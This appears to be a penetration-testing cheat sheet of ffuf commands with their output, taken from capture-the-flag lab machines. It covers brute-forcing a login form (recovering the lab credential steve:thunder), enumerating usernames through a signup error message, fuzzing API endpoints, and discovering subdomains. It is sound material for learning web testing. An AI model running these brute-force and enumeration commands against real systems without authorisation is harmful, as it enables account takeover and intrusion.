### Brute force password
```bash
$ ffuf -w valid_usernames.txt:W1,./SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.84.98/customers/login -fc 200

        /___\  /___\           /___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.84.98/customers/login
 :: Wordlist         : W1: valid_usernames.txt
 :: Wordlist         : W2: ./SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=W1&password=W2
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 200
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 89ms]
    * W1: steve
    * W2: thunder

:: Progress: [303/303] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```


### regex matcher from response 

-mr key here helps us to match regex
```bash
$ ffuf -w ~/Documents/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.84.98/customers/signup -mr "username already exists"

        /___\  /___\           /___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.84.98/customers/signup
 :: Wordlist         : FUZZ: /home/kali/Documents/SecLists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&email=x&password=x&cpassword=x
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: username already exists
________________________________________________

admin                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 67ms]
robert                  [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 67ms]
simon                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 67ms]
steve                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 68ms]
:: Progress: [10177/10177] :: Job [1/1] :: 581 req/sec :: Duration: [0:00:18] :: Errors: 0 ::

```


### if u use ffuf, remember that this tool filter all response codes, that are not accepted in matcher line !!!!

```bash
$ ffuf -X POST -u 'http://10.10.11.161/api/v1/user/FUZZ' -w ~/Documents/SecLists/Discovery/Web-Content/raft-medium-directories.txt --mc all --fc 405 

        /___\  /___\           /___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.11.161/api/v1/user/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Documents/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 405
________________________________________________

login                   [Status: 422, Size: 172, Words: 3, Lines: 1, Duration: 77ms]
signup                  [Status: 422, Size: 81, Words: 2, Lines: 1, Duration: 112ms]

```


### search subdomains
```bash
ffuf -w ~/Documents/SecLists/Discovery/DNS/shubs-subdomains.txt -H "Host: FUZZ.stocker.htb" -u http://stocker.htb -fw 6 -mc all
```